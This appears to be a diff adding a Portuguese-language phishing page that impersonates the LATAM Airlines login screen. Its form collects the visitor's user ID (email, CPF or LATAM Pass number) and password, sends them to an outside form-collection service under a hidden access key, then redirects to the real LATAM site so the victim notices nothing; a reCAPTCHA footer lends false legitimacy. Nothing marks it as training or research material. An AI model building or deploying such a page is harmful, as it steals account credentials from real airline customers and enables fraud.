@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+  <title>LATAM LOGIN</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      font-family: "LATAM Sans", "Trebuchet MS", sans-serif;
+      height: 100vh;
+      margin: 0;
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .container {
+      padding: 20px;
+
+    }
+
+    input {
+      box-sizing: border-box;
+      width: 100%;
+      height: 50px;
+      font-weight: 300;
+      margin-top: 10px;
+      margin-bottom: 10px;
+      padding: 0 20px;
+      border: 1px solid #c1c1c1;
+      font-family: "Montserrat", sans-serif;
+      font-size: 14px;
+      color: #333;
+      border-radius: 4px;
+      background-color: white;
+    }
+
+    .password-input {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .password-toggle {
+      position: absolute;
+      transform: translatex(365px);
+      cursor: pointer;
+      color: #333;
+      top: 52%;
+    }
+
+    button {
+      width: 100%;
+      height: 50px;
+      font-weight: 600;
+      background-color: rgb(232, 17, 75);
+      color: white;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+      border-radius: 10px;
+    }
+
+    .help-text {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 10px;
+      flex-wrap: wrap;
+    }
+
+    .no-show-again {
+      margin-right: 5px;
+    }
+
+    .version {
+      color: #BCBFC0;
+      margin-top: 10px;
+    }
+
+    /* Responsividade para telas menores (celulares) */
+    @media (max-width: 600px) {
+      input {
+        font-size: 12px;
+      }
+
+      button {
+        font-size: 16px;
+      }
+    }
+  </style>
+
+</head>
+
+<body>
+
+  <script>
+    function applyCPFFormat(input) {
+      const cleanedInput = input.value.replace(/\D/g, '');
+
+      let formattedCPF = '';
+
+      if (cleanedInput.length > 0) {
+        formattedCPF = cleanedInput.substring(0, 3);
+
+        if (cleanedInput.length >= 4) {
+          formattedCPF += '.' + cleanedInput.substring(3, 6);
+        }
+
+        if (cleanedInput.length >= 7) {
+          formattedCPF += '.' + cleanedInput.substring(6, 9);
+        }
+
+        if (cleanedInput.length >= 10) {
+          formattedCPF += '-' + cleanedInput.substring(9, 11);
+        }
+      }
+
+      input.value = formattedCPF;
+    }
+
+
+
+
+    let passwordVisible = false;
+
+    function togglePasswordVisibility() {
+      const eyeIcon = document.querySelector('.fas')
+      const passwordInput = document.getElementById('SENHA');
+      passwordVisible = !passwordVisible;
+
+      if (!passwordVisible) {
+        passwordInput.type = 'password';
+        eyeIcon.classList.remove('fa-eye');
+        eyeIcon.classList.add('fa-eye-slash');
+      } else {
+        passwordInput.type = 'text';
+        eyeIcon.classList.remove('fa-eye-slash');
+        eyeIcon.classList.add('fa-eye');
+      }
+    }
+
+    function allowOnlyNumbers(input) {
+      input.value = input.value.replace(/\D/g, '');
+    }
+
+
+  </script>
+
+
+
+  <div class="container">
+
+    <img src="images/logo.png" alt="logo latam"
+      style="margin:20px 0 10px 0;vertical-align: middle;width: 120px;height: 40px;">
+
+    <form action="https://api.staticforms.xyz/submit" method="post" onsubmit="handleFormSubmit(event)">
+      <input type="hidden" name="accessKey" value="50987522-205b-47cc-a703-1a19d94ace80"> <!-- Required -->
+
+
+      <h2 style="
+    font-style: normal;
+    font-size: 1.3rem;
+    line-height: 1.75rem;
+    letter-spacing: 0.016rem;
+    font-weight: 300;
+    color: rgb(27, 0, 136);
+    ">
+        Insira seu usuário
+      </h2>
+
+      <p>Dê preferência ao seu número LATAM Pass ao inserir seus dados:</p>
+
+      <!-- atributos -->
+      <!-- pattern="\d{3}\.\d{3}\.\d{3}-\d{2}" -->
+      <!-- oninput="applyCPFFormat(this)" -->
+      <!-- maxlength="14" -->
+      <input type="text" id="CPF" name="$Usuario" placeholder="Email, CPF ou Numero De Cliente" required>
+
+
+      <!-- Alteração no campo senha -->
+      <div style="display:flex;align-items:center ;position: relative;">
+
+        <!-- atributos -->
+        <!-- maxlength="8" -->
+        <!-- oninput="allowOnlyNumbers(this)" -->
+        <input type="password" class="password-input" id="SENHA" name="$SENHA" placeholder="Digite Sua Senha" required>
+
+        <i style="    
+          position: absolute;
+          top: 35%;
+          right: 8%;
+          cursor: pointer;
+          color: black;
+          width: 10px;
+          height: 10px;
+          " onclick="togglePasswordVisibility()" class="fas fa-eye-slash"></i>
+
+      </div>
+
+      <input type="hidden" name="redirectTo" value="https://www.latamairlines.com/br/pt?gad=1">
+      <!-- Optional -->
+
+      <button type="submit">Continuar</button>
+    </form>
+
+  </div>
+
+  <footer style="padding: 20px;max-width: 450px;">
+    <span>Protegido por reCAPTCHA e se aplica às
+      <a href="https://policies.google.com/privacy" target="_blank">Políticas de Privacidade</a>
+
+      e aos
+      <a href="https://policies.google.com/terms" target="_blank">Termos de Serviço do Google</a>
+    </span>
+  </footer>
+
+
+</body>
+
+</html>
